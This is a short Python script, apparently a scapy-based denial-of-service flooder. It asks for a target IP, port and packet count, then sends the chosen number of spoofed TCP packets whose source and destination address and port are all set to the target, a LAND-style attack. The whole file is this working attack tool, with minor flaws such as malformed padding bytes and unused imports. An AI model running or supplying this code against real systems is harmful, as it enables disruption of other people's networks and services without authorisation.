import os
import sys
import platform
import shutil
from scapy.all import *

ip = input(str('Enter IP: '))
prt = int(input('Enter Port: '))
dos = int(input('Number of Packets: '))

data = b'x00' * 300

p = IP(dst=ip, src=ip, ttl=200)/TCP(dport=prt, sport=prt)/data

fire = p * dos

send(fire)


    